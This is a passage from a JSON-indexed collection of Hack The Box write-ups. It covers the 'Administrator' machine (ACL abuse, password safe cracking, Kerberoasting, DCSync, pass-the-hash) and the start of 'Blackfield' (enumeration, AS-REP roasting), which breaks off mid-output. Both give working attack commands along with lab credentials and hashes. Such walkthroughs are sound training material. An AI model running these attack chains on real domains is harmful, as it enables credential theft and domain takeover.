10.10.11.42\n</code></pre>"},{"location":"ch3ckm8_HTB_Administrator/#usage-breakdown_2","title":"usage breakdown:","text":"<ol> <li>At first we specify the known user's creds</li> <li>we use the -d parameter to specify the domain</li> <li>we use -ns to specify the nameserver (DNS server) to 10.10.11.42 (machine's IP)     we need to specify the DNS server, because querying AD over LDAP requires DNS resolution to locate the DC</li> </ol> <p>-&gt; overall, we login to the given domain with the given creds for an account, collect AD data (users, groups, computers, permissions, ACLs, etc.), use the machine's IP as the DNS server to resolve the DC's IP and lastly save the data in json format, which can later be imported to BloodHound for visualization.</p>"},{"location":"ch3ckm8_HTB_Administrator/#output_2","title":"output","text":"<pre><code>INFO: Found AD domain: administrator.htb\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known\nINFO: Connecting to LDAP server: dc.administrator.htb\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: dc.administrator.htb\nINFO: Found 11 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc.administrator.htb\nINFO: Done in 00M 11S\n</code></pre>"},{"location":"ch3ckm8_HTB_Administrator/#add-the-dc-to-etc-hosts","title":"add the DC to etc hosts","text":"<pre><code>echo '10.10.11.42 Administrator.htb dc.administrator.htb' | sudo tee -a /etc/hosts\n</code></pre>"},{"location":"ch3ckm8_HTB_Administrator/#bloodhound-visualization","title":"BloodHound visualization","text":"<p>As we can see in the pics above, we reach to the conclusion that Olivia has GenericAll permission towards Michael, and Michael has ForceChangePassword permission towards Benjamin, so our path to exploit this looks like this: (we have marked olivia as owned here)  { Olivia }-----( GenericAll )-----&gt;{ Michael }-----( ForceChangePassword )-----&gt;{ Benjamin }</p>"},{"location":"ch3ckm8_HTB_Administrator/#but-what-do-those-permissions-actually-mean","title":"But what do those permissions actually mean?","text":"<ul> <li> <p>GenericAll     Grants full control over an object, so we are talking about one of the most powerful permissions in AD. An account with such permissions can:     \u2705 Reset the password of a user account (including admin accounts).     \u2705 Modify group memberships (e.g., add itself to Domain Admins).     \u2705 Modify object attributes (like Service Principal Names for Kerberoasting).     \u2705 Run remote code if the target is a computer account.</p> </li> <li> <p>ForceChangePassword     pretty self explanatory, is should be noted though that it allows an account to change another user's password without knowing the old password.</p> </li> </ul>"},{"location":"ch3ckm8_HTB_Administrator/#changing-passwords-with-bloodyad","title":"Changing Passwords with BloodyAD","text":""},{"location":"ch3ckm8_HTB_Administrator/#step-1-change-michaels-password-olivia-michael","title":"Step 1: Change Michael's Password (Olivia -&gt; Michael)","text":"<p>Use Olivia's account to change Michael's pass <pre><code>bloodyad --host \"10.10.11.42\" -d \"Administrator.htb\" -u \"olivia\" -p \"ichliebedich\" set password \"michael\" \"TheBestPasswordYouHaveEverSeenOrHeard\"\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Administrator/#step-2-change-benjamins-password-michael-benjamin","title":"Step 2: Change Benjamin's Password (Michael -&gt; Benjamin)","text":"<p>Use Michael's account (with the new pass we set earlier) to change Benjamin's pass <pre><code>bloodyad --host \"10.10.11.42\" -d \"Administrator.htb\" -u \"michael\" -p \"TheBestPasswordYouHaveEverSeen\" set password \"TheSecondBestPasswordYouHaveEverSeenOrHeard\"\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Administrator/#step-3-login-to-winrm-using-benjamins-creds","title":"Step 3: login to winrm using Benjamin's creds","text":"<p>Now comes the tricky part , user benjamin cant login to winrm !!</p> <p>(ch3ckm8)       (table) (\u256f\u00b0\u25a1\u00b0\uff09\u256f\ufe35 \u253b\u2501\u253b </p> <p>narrator: okay apparently he does not like this table, dude relax, put the table down, keep pro-hacking</p> <p>after inspection through his AD permissions it appears that he has NO permission towards other users: </p>"},{"location":"ch3ckm8_HTB_Administrator/#log-in-to-ftp-as-benjamin","title":"Log in to FTP as Benjamin","text":"<p>connect <pre><code>ftp administrator.htb\n</code></pre> insert creds <pre><code>user: Benjamin\npass: \"TheSecondBestPasswordYouHaveEverSeenOrHeard\"\n</code></pre> run ftp commands <pre><code>ls\n</code></pre> we see this, appears to be some backup file <pre><code>Backup.psafe3\n</code></pre> lets download it locally, then we can exit, nothing further valuable found <pre><code>get Backup.psafe3\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Administrator/#what-is-a-psafe3-file","title":"What is a psafe3 file?","text":"<p>These kind of files are encrypted password safe files!  used by PasswordSafe app (https://passwordsafe.app/), so obviously it cant be read in this form, we must use a tool to obtain hash from it, i chose pwsafe2john tool <pre><code>pwsafe2john Backup.psafe3 \n</code></pre> we get the following hash: <pre><code>Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Administrator/#lets-decrypt-the-obtained-hash-using-johntheripper","title":"lets decrypt the obtained hash using johntheripper","text":"<p>lets try using the most commonly used wordlist \"rockyou\" and see what we get  <pre><code>john psafe3hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n</code></pre> the decryption is successful, and we get the following pass: <pre><code>tekieromucho\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Administrator/#unlock-the-password-safe","title":"Unlock the password safe","text":"<p>To sum up shortly, we got: - The actual safe backup file (pwsafe3) - The password that unlocks it</p> <p>-&gt; so now we can install the app on our attacker machine, and open the .psafe3 file using the obtained pass, then we get the 3 user's passwords <pre><code>alexander\nUrkIbagoxMyUGw0aPlj9B0AXSea4Sw\n</code></pre></p> <pre><code>emily\nUXLCI5iETUsIBoFVTj8yQFKoHjXmb\n</code></pre> <pre><code>emma\nWwANQWnmJnGV07WQN8bMS7FMAbjNur\n</code></pre>"},{"location":"ch3ckm8_HTB_Administrator/#foothold","title":"FootHold","text":"<p>Since we have the passwords for 3 users, we should figure out how to login to them on the target host, using their creds.</p> <p>By looking again at the results of the nmap scan we performed initially, we see open port 5985, and this only means one thing: WinRM</p> <p>Lets try to connect to emily user on the target host using winrm: <pre><code>evil-winrm -i Administrator.htb -u emily -p \"UXLCI5iETUsIBoFVTj8yQFKoHjXmb\"\n</code></pre> After some inspection, we see that we can grab the user flag from emily's Desktop folder <pre><code>type \\Desktop\\user.txt\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Administrator/#so-now-what","title":"so now what?","text":"<p>Now that we have gained access (foothold) to one user (emily), lets see what permissions our current logged in user has over others.</p> <p>Looking at bloodhound, our path tp exploiting this should look like this: </p>"},{"location":"ch3ckm8_HTB_Administrator/#check-ad-permissions","title":"Check AD permissions","text":"<p>As we can see on bloodhound, emily has \"GenericWrite\" permission over ethan </p>"},{"location":"ch3ckm8_HTB_Administrator/#kerberoasting","title":"Kerberoasting","text":"<p>-&gt; Refers to an attack tehinique where the attacker extracts Kerberos Service Tickets (TGS) and later attempts to crack them offline, in order to then obtain the plaintext creds. It must be noted that A domain user can request ANY service ticket.</p> <p>we will use this python script, which speeds up the process of kerberoasting attack  https://github.com/ShutdownRepo/targetedKerberoast <pre><code>python targetedKerberoast.py -u \"emily\" -p \"UXLCI5iETUsIBoFVTj8yQFKoHjXmb\" -d \"Administrator.htb\" --dc-ip 10.10.11.42\n</code></pre> and we get ethan's hash <pre><code>[*] Starting kerberoast attacks\n[*] Fetching usernames from Active Directory with LDAP\n[+] Printing hash for (ethan)\n$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$15ec7606ffa3297b86b280475f514f9c$2e4d87fb991fa421183d34d1f57dc6eff6cf90d47f165e99e8caa4042a91278d9ae1897d9b5bd1c4938ae952b02b253b63207405bb7f66b8509c614b4e8a0fe9bff6e4ae67a8c6df5ce80d08d1e2f0cc78389f94289f4fe121f402cf1d8a411db8e49116ae92534989d03f740899d01f2f264273ad4da38a5537fde4c4d629961839c4a7916a3f246240ce1e50602d648a17d05384131d1729c9debfe576e9a37bf347899896e9df8bec3b2ac16110da971e0142ef5435bb73ee2fca6baf923ad26540ff42b735d73ff730cdb075026d0646247db541b3c824a2c8fef6c72572d06c64f341778b0456cbf6376f22bc444228cc4fef86c8bb62093c7081daf6ab75c809508c2ca0ab0fe679e1dbbd753441316d58d1245fdcd9e1b8ef58faa2c71ae319296eeda923da7a42677e65a7ab048b694ea8f880bb021740f94eb4f9b1416d37cd75f41c2b9d045370890611857ae2576e117c1ca52de93918d7104e95c95cd130b2d06805d6c99d5c13b61ab0040f02117accc14a8ad06e2f6d66103c07e9e96a6a2a94f4a12e34e9c3f8b46a305e778a17958128465967076c0365d7c87bb6c517d8ab27d1a89f582a72e303bf0ac54c1c7d2fbe80b2500cab320cdbac803fdfa2c8a54e8db9870a5dd73193a85878752373da71d223e8cdd47dcd2ba3c3b353bc5f1af493da902c90b5a26a218aa6875ff9ffa5bc8bc2f1f90d65502819f01f3c8539950c1d905b2bd803145cfd603a6d75a654ce2c83210b59ed9e6c232841a7d6f5e706072e8e9ed38baaf4c04640841726e61a7f484e900ef1515480ba9b337f80c9cc9d0f974aff33b83897d340a925ab084d60914f708eb5cb917c91ecb362b490f2da965fc476956c7f2d9968ed61b10bdacd2c371955253ebbddfbfc97ee2b38badec0413bca0ec1e11aa44429c6d3d9ab73aaa4a1425fbf23123260c42ed28229e3b766ed0c5682eb6b097b315f72b8ce387978525b3800229f5a0980de2b1f947168c6956d06c8ad9178aefd34addba5e3c9f719619aa29301579cd426415ae8c9d832a93ce3beccf70b58340e949b12e9e6d9d7ef80a3b5852f0e372ba786237cb3f6b2a2738a3b70fd070f5ecd59e5cab52cb145113fc0f4832ba7adc297d6a01167773f9a9a3a5302a0c6a672b1437372d349752350778db5dcdb5f986a7b3110d2584d12a21d32960c061d0f5a60f182257b8954fcd13936b14ef1c6cd5396b2d3549971d83ef116fe4e65916c73f7d231e1c7c99bd82854b152c016f663ecc4c962a30dce3569f088398f8d230996901bfa72f3427ede4d73d1f7b8828fe098c958867c3bd9017002c3e74fbe73650d05228039b57c916ae017e89859afb79c9fb951c815476495819840ae9468fdb66d6ee687de54fed4724c77eee4bd4f9b4995005f644e2b1a58f87deb91088ec9e318fe9d1f6b34a33f6e2e001c2a0e3c0d7f463376a5e3827fadf2a88d6f79d73188b207e06b3207700a5929dd3b6d7fe47bb71402d1881a49a990f0472d912937b66825\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Administrator/#decrypt-the-obtained-ethans-hash","title":"decrypt the obtained ethan's hash","text":"<p><pre><code>john ethanhash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n</code></pre> and we get the pass: <pre><code>limpbizkit\n</code></pre> so now that we have another user's pass, lets repeat the process we did before, by checking this user's permissions over other users</p>"},{"location":"ch3ckm8_HTB_Administrator/#check-ad-permissions_1","title":"Check AD permissions","text":"<p>As we can see on bloodhound, ethan has \"DCSync\" rights over the domain. </p>"},{"location":"ch3ckm8_HTB_Administrator/#what-this-means-to-progress","title":"what this means to progress","text":"<p>We see that ethan has permissions over the domain (administrator), not any user, so thats our first clue. Secondly, we must understand what those permissions allow us to do, and with a little research we find that permissions \"Getchanges\" and \"GetChangesAll\"  allow us to perform a DCsync attack ! https://bloodhound.specterops.io/resources/edges/dc-sync</p> <p>-&gt; DCsync\u00a0is an\u00a0attack\u00a0that allows an adversary to simulate the behavior of a domain controller (DC) and retrieve password data via domain replication</p> <p>So with this kind of attack, we can obtain the Administrator's hash, in order to crack it (decrypt it) offline.</p> <p>For this attack, we are going to use impacket-secretsdump for the following reasons: - at first it uses the user's creds to connect remotely to the DC via smbexec/wmiexec and obtain high permissions - then exports the hash of local accounts from the registry - exports all domain user's hashes through DCsync or from NTDS.dit file     The\u00a0ntds.dit\u00a0file functions as the core database that powers Active Directory, containing essential data like user credentials, group policies, security settings, and domain configurations      (https://www.cayosoft.com/ntds-dit/) - allows connections to the DC from computers outside the domain </p>"},{"location":"ch3ckm8_HTB_Administrator/#privesc","title":"Privesc","text":"<p>So, with the aforementioned tool using ethan's creds: <pre><code>impacket-secretsdump \"Administrator.htb/ethan:limpbizkit\"@\"dc.Administrator.htb\"\n</code></pre> we obtain Administrator's hash <pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::\n</code></pre></p> <p>then, we follow the standard procedure, via evil-winrm to login to user Administrator with the hash <pre><code>evil-winrm -i administrator.htb -u administrator -H \"3dc553ce4b9fd20bd016e098d2d2fd2e\"\n</code></pre> finally we get the root flag! <pre><code>type \\Desktop\\ root.txt\n</code></pre></p> <p>(table down) \u252c\u2500\u252c\u30ce( \u00ba _ \u00ba\u30ce)</p>"},{"location":"ch3ckm8_HTB_Administrator/#conclusion","title":"Conclusion","text":"<p>This machine felt kinda straightforward and like an introductory machine to AD related machines.</p> <p>After the initial smb enumeration and ad enumeration, the rest of the activities were easier to follow and execute. </p> <p>narrator: \"It has been foretold by an ancient prophecy, the arrival of the security analyst who shall flip the table when things go wrong, unleashing chaos in the face of failed exploits. And yet, when the battle is won, and the hack is complete, they shall calmly return the table to its rightful place, as if nothing ever happened.\"</p>"},{"location":"ch3ckm8_HTB_Administrator/#sidenotes","title":"Sidenotes","text":"<p>I'm not a hacker, I'm just an analyst with excessive caffeine in my bloodstream... oh and mr robot was my 3rd cousin (i know not fair) ## \u00af_(\u30c4)_/\u00af</p> <p>WARNING! pwn badge flexing below: https://www.hackthebox.com/achievement/machine/284567/634 </p> <p>If you reached that far, you must be a big fan, make sure to check my yt channel for more: https://www.youtube.com/watch?v=xvFZjo5PgG0</p>"},{"location":"ch3ckm8_HTB_Blackfield/","title":"Blackfield","text":""},{"location":"ch3ckm8_HTB_Blackfield/#intro","title":"Intro","text":"<p>[[windows]] [[NotAssumedBreach]] [[OSCPpath]] [[PrivGroupAbuse]]</p> <p>Tags: #windows #NotAssumedBreach #OSCPpath #PrivGroupAbuse  Tools used: - rpcclient (RPC enum) - smbmap (SMB enum) - smbclient (SMB enum) - nxc (enumeration) - GetNPUsers.py (AS-REP roasting) - bloodyAD (AD password reset) - pypykatz (dumping LSASS dump) - impacket-secretsdump (dumping NTDS)</p>"},{"location":"ch3ckm8_HTB_Blackfield/#reconnaissance","title":"Reconnaissance","text":""},{"location":"ch3ckm8_HTB_Blackfield/#add-target-to-etchosts","title":"Add target to /etc/hosts","text":"<pre><code>sudo sh -c \"echo '10.129.164.18 blackfield.htb' &gt;&gt; /etc/hosts\"\n</code></pre>"},{"location":"ch3ckm8_HTB_Blackfield/#nmap-scan","title":"Nmap scan","text":"<pre><code>sudo nmap -sC -sV blackfield.htb\n</code></pre> <p><pre><code>Starting Nmap 7.94SVN ( &lt;https://nmap.org&gt; ) at 2025-08-04 17:06 CDT\nNmap scan report for blackfield.htb (10.129.164.18)\nHost is up (0.0076s latency).\nNot shown: 993 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-05 05:06:57Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-08-05T05:07:00\n|_  start_date: N/A\n|_clock-skew: 6h59m59s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .\nNmap done: 1 IP address (1 host up) scanned in 51.27 seconds\n</code></pre> According to the open ports this appears to be a DC, lets move on towards the enumeration of services, nothing further interesting really stands out by just observing the above scan results.</p>"},{"location":"ch3ckm8_HTB_Blackfield/#rpc-enumeration-as-anonymous","title":"RPC enumeration as anonymous","text":"<p>Anonymous login: <pre><code>rpcclient -U \"\" -N blackfield.htb\n</code></pre> was not successful</p>"},{"location":"ch3ckm8_HTB_Blackfield/#ldap-enumeration-as-anonymous","title":"LDAP enumeration as anonymous","text":"<pre><code>ldapsearch -LLL -x -H ldap://blackfield.htb -s base namingcontexts \n</code></pre> <pre><code>dn:\nnamingcontexts: DC=BLACKFIELD,DC=local\nnamingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local\nnamingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local\nnamingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local\nnamingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local\n</code></pre> <p>check if anonymous login is allowed <pre><code>ldapsearch -LLL -x -H ldap://cascade.htb -b \"DC=cascade,DC=local\"\n</code></pre> i got nothing, so that means that\u00a0anonymous bind is not enabled</p>"},{"location":"ch3ckm8_HTB_Blackfield/#enum4linux","title":"Enum4linux","text":"<p><pre><code>ENUM4LINUX - next generation (v1.3.4)\n\n ==========================\n|    Target Information    |\n ==========================\n[*] Target ........... blackfield.htb\n[*] Username ......... ''\n[*] Random Username .. 'glltacrg'\n[*] Password ......... ''\n[*] Timeout .......... 5 second(s)\n\n =======================================\n|    Listener Scan on blackfield.htb    |\n =======================================\n[*] Checking LDAP\n[+] LDAP is accessible on 389/tcp\n[*] Checking LDAPS\n[-] Could not connect to LDAPS on 636/tcp: timed out\n[*] Checking SMB\n[+] SMB is accessible on 445/tcp\n[*] Checking SMB over NetBIOS\n[-] Could not connect to SMB over NetBIOS on 139/tcp: timed out\n\n ======================================================\n|    Domain Information via LDAP for blackfield.htb    |\n ======================================================\n[*] Trying LDAP\n[+] Appears to be root/parent DC\n[+] Long domain name is: BLACKFIELD.local\n\n =============================================================\n|    NetBIOS Names and Workgroup/Domain for blackfield.htb    |\n =============================================================\n[-] Could not get NetBIOS names information via 'nmblookup': timed out\n\n ===========================================\n|    SMB Dialect Check on blackfield.htb    |\n ===========================================\n[*] Trying on 445/tcp\n[+] Supported dialects and settings:\nSupported dialects:\n  SMB 1.0: false\n  SMB 2.02: true\n  SMB 2.1: true\n  SMB 3.0: true\n  SMB 3.1.1: true\nPreferred dialect: SMB 3.0\nSMB1 only: false\nSMB signing required: true\n\n =============================================================\n|    Domain Information via SMB session for blackfield.htb    |\n =============================================================\n[*] Enumerating via unauthenticated SMB session on 445/tcp\n[+] Found domain information via SMB\nNetBIOS computer name: DC01\nNetBIOS domain name: BLACKFIELD\nDNS domain: BLACKFIELD.local\nFQDN: DC01.BLACKFIELD.local\nDerived membership: domain member\nDerived domain: BLACKFIELD\n\n ===========================================\n|    RPC Session Check on blackfield.htb    |\n ===========================================\n[*] Check for null session\n[+] Server allows session using username '', password ''\n[*] Check for random user\n[+] Server allows session using username 'glltacrg', password ''\n[H] Rerunning enumeration with user 'glltacrg' might give more results\n\n =====================================================\n|    Domain Information via RPC for blackfield.htb    |\n =====================================================\n[+] Domain: BLACKFIELD\n[+] Domain SID: S-1-5-21-4194615774-2175524697-3563712290\n[+] Membership: domain member\n\n =================================================\n|    OS Information via RPC for blackfield.htb    |\n =================================================\n[*] Enumerating via unauthenticated SMB session on 445/tcp\n[+] Found OS information via SMB\n[*] Enumerating via 'srvinfo'\n[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED\n[+] After merging OS information we have the following result:\nOS: Windows 10, Windows Server 2019, Windows Server 2016\nOS version: '10.0'\nOS release: '1809'\nOS build: '17763'\nNative OS: not supported\nNative LAN manager: not supported\nPlatform id: null\nServer type: null\nServer type string: null\n\n =======================================\n|    Users via RPC on blackfield.htb    |\n =======================================\n[*] Enumerating users via 'querydispinfo'\n[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED\n[*] Enumerating users via 'enumdomusers'\n[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED\n\n ========================================\n|    Groups via RPC on blackfield.htb    |\n ========================================\n[*] Enumerating local groups\n[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED\n[*] Enumerating builtin groups\n[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED\n[*] Enumerating domain groups\n[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED\n\n ========================================\n|    Shares via RPC on blackfield.htb    |\n ========================================\n[*] Enumerating shares\n[+] Found 0 share(s) for user '' with password '', try a different user\n\n ===========================================\n|    Policies via RPC for blackfield.htb    |\n ===========================================\n[*] Trying port 445/tcp\n[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED\n\n ===========================================\n|    Printers via RPC for blackfield.htb    |\n ===========================================\n[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED\n</code></pre> Nothing too interesting here</p>"},{"location":"ch3ckm8_HTB_Blackfield/#smb-enumeration-as-anonymous","title":"SMB enumeration as anonymous","text":"<p>SMB anonymous logon <pre><code>nxc smb blackfield.htb  -u '' -p '' --shares\n</code></pre></p> <pre><code>SMB         10.129.164.18   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)\nSMB         10.129.164.18   445    DC01             [+] BLACKFIELD.local\\\\: \nSMB         10.129.164.18   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED\n</code></pre> <p>does not appear successful, BUT lets try smbmap too: <pre><code>smbmap -H blackfield.htb -u null\n</code></pre></p> <p><pre><code>[+] Guest session       IP: blackfield.htb:445  Name: unknown                                           \nDisk                                                Permissions Comment\n----                                                ----------- -------\nADMIN$                                              NO ACCESS   Remote Admin\nC$                                                  NO ACCESS   Default share\nforensic                                            NO ACCESS   Forensic / Audit share.\nIPC$                                                READ ONLY   Remote IPC\nNETLOGON                                            NO ACCESS   Logon server share \nprofiles$                                           READ ONLY   \nSYSVOL                                              NO ACCESS   Logon server share \n</code></pre> interesting! it appears that we can view shares via guest session!</p> <p>Lets try inspecting the shares, the share <code>forensic</code> appears to not be a default one, but dont have permissions to view it. So we should focus to the shares that we have <code>READ ONLY</code> permissions such as the <code>IPC$</code> and <code>profiles$</code> <pre><code>smbclient -N //blackfield.htb/IPC$\n</code></pre> got NT_STATUS_NO_SUCH_FILE listing * , we cant access that share.  </p> <p>I then inspected the <code>profiles$</code> share: <pre><code>smbclient -N //blackfield.htb/profiles$\n</code></pre></p> <pre><code>mb: \\\\&gt; ls\n  .                                   D        0  Wed Jun  3 11:47:12 2020\n  ..                                  D        0  Wed Jun  3 11:47:12 2020\n  AAlleni                             D        0  Wed Jun  3 11:47:11 2020\n  ABarteski                           D        0  Wed Jun  3 11:47:11 2020\n  ABekesz                             D        0  Wed Jun  3 11:47:11 2020\n  ABenzies                            D        0  Wed Jun  3 11:47:11 2020\n  ........\n</code></pre> <p>its contents appear to be usernames! also each one of them contains nothing, BUT this is a way to collect all users, so i copied all of them in a txt, and then sanitized the usernames so a new txt containing only them is formed: <pre><code>awk '{print $1}' share_list.txt &gt; usernames.txt\n</code></pre></p> <p><pre><code>$ cat usernames.txt \nAAlleni\nABarteski\nABekesz\nABenzies\nFoothold\n</code></pre> great! now that we have the usernames in a format that is usable, we can do a multitude of things.</p> <p>For example we could try hunting for users that have the flag <code>DONT_REQ_PREAUTH</code> enabled, a method called <code>AS-REP</code> roasting.</p>"},{"location":"ch3ckm8_HTB_Blackfield/#as-rep-roasting","title":"AS-REP roasting","text":"<p>TO perform AS-REP roasting, i will use <code>GetNPUsers.py</code> <pre><code>GetNPUsers.py -dc-ip 10.129.164.18 BLACKFIELD.local/ -usersfile usernames.txt &gt; as-rep-roast.txt\n</code></pre></p> <p>aand we got an asrep hash! and it appears to be associated with user <code>support</code> <pre><code>$krb5asrep$23$support@BLACKFIELD.LOCAL:3bbe070692d760efc2224b563d1387b8$8bbe45bc2b5f1e80b063a9ceeb35754757f8851e1307c98d3bfcd05be9382d09ad731a9c6547414b5c15d3540903884aa7cb8aab778286593b5c76ab51ce572cbd9ea69d890c48123bb8cfbd3ceac109d9b46e1dc268625f0a7e08fd12f8f3dbc1117556b3326f259ea5d387c2d230728c00115d7fb525ee58b94dc8564dd511a95dfd327790ff1d44d2e215fd149d887033f5f5263a5c1759d8898ffd9093d5d498d44452bb6c7eef15587853e7941c3b2d1840727b2a09df7b04e8bbd35769537304ba20b08328f4dbb3f17f8b4d26fe910d4a4e4867fa482a9b7e3c130969df69a14092b40675b6a8c64be12f5afe4ecc7fca\n</code></pre></p> <p>lets crack it: <pre><code>john hash_blackfield_support.txt --wordlist=rockyou.txt\n</code></pre> the retrieved password is <pre><code>#00^BlackKnight\n</code></pre> so the creds are <pre><code>support\n#00^BlackKnight\n</code></pre></p> <p>Lets now use my script to bulk check the services to which we can login with those creds: ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check <pre><code>./auto_netexec_bulk_creds_checker.sh blackfield.htb 'support' '#00^BlackKnight'\n</code></pre></p> <p><pre><code>[*] Checking if winrm port 5985 is open on blackfield.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.129.164.18   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)\nWINRM       10.129.164.18   5985   DC01             [-] BLACKFIELD.local\\\\support:#00^BlackKnight\n\n[*] Checking if smb port 445 is open on blackfield.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.129.164.18   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)\nSMB         10.129.164.18   445    DC01             [+] BLACKFIELD.local\\\\support:#00^BlackKnight \n\n[*] Checking if ldap port 389 is open on blackfield.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.129.164.18   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)\nLDAP        10.129.164.18   389    DC01             [+] BLACKFIELD.local\\\\support:#00^BlackKnight \n\n[*] Checking if rdp port 3389 is open on blackfield.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on blackfield.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.129.164.18   135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)\nRPC         10.129.164.18   135    DC01             [+] BLACKFIELD.local\\\\support:#00^BlackKnight \n\n[*] Checking if nfs port 2049 is open on blackfield.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on blackfield.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on blackfield.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on blackfield.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on blackfield.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> interesting, according the the above output, with those creds, we can login to <code>RPC</code> , <code>SMB</code> and <code>LDAP</code>. So we should continue to enumerate again, using the obtained credentials this time.</p>"},{"location":"ch3ckm8_HTB_Blackfield/#rpc-enumeration-as-user-support","title":"RPC enumeration as user <code>support</code>","text":"<pre><code>rpcclient -U 'support%#00^BlackKnight' blackfield.htb\n</code></pre> <p><pre><code>rpcclient $&gt; enumdomains\nname:[BLACKFIELD] idx:[0x0]\nname:[Builtin] idx:[0x0]\n\nrpcclient $&gt; enumdomusers\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[audit2020] rid:[0x44f]\nuser:[support] rid:[0x450]\nuser:[BLACKFIELD764430] rid:[0x451]\nuser:[BLACKFIELD538365] rid:[0x452]\n...\nuser:[BLACKFIELD438814] rid:[0x584]\nuser:[svc_backup] rid:[0x585]\nuser:[lydericlefebvre] rid:[0x586]\n\nrpcclient $&gt; enumdomgroups\ngroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]\ngroup:[Domain Admins] rid:[0x200]\ngroup:[Domain Users] rid:[0x201]\ngroup:[Domain Guests] rid:[0x202]\ngroup:[Domain Computers] rid:[0x203]\ngroup:[Domain Controllers] rid:[0x204]\ngroup:[Schema Admins] rid:[0x206]\ngroup:[Enterprise Admins] rid:[0x207]\ngroup:[Group Policy Creator Owners] rid:[0x208]\ngroup:[Read-only Domain Controllers] rid:[0x209]\ngroup:[Cloneable Domain Controllers] rid:[0x20a]\ngroup:[Protected Users] rid:[0x20d]\ngroup:[Key Admins] rid:[0x20e]\ngroup:[Enterprise Key Admins] rid:[0x20f]\ngroup:[DnsUpdateProxy] rid:[0x44e]\n</code></pre> okay, found some valuable info about users and groups, but for our convenience we will later proceed with LDAP enumeration by using bloodhound so we can get a better graphical representation.</p>"},{"location":"ch3ckm8_HTB_Blackfield/#smb-enumeration-as-user-support","title":"SMB enumeration as user <code>support</code>","text":"<pre><code>nxc smb blackfield.htb  -u 'support' -p '#00^BlackKnight' --shares\n#or\nsmbmap -H blackfield.htb -u 'support' -p '#00^BlackKnight'\n</code></pre> <pre><code>SMB         10.129.164.18   445    DC01             Share           Permissions     Remark\nSMB         10.129.164.18   445    DC01             -----           -----------     ------\nSMB         10.129.164.18   445    DC01             ADMIN$                          Remote Admin\nSMB        